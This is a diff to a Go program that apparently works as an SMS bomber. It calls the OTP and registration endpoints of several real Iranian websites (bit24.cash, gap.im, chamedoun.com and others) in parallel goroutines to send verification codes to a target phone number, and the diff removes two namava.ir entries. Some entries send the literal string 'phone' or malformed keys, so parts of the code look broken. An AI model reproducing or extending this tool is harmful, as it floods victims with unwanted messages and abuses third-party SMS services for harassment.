@@ -369,9 +369,6 @@ func main() {
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
-			"UserName": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
 			"null, Username": phone,
 		}, ch)  // edit :4/22/2025
@@ -501,9 +498,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
 			"phone": "phone",
-		}, ch)  // edit :4/22/2025
-		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
-			"UserName": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://core.gap.im/v1/user/sendOTP.gap", map[string]interface{}{
 			"mobile­": "phone",
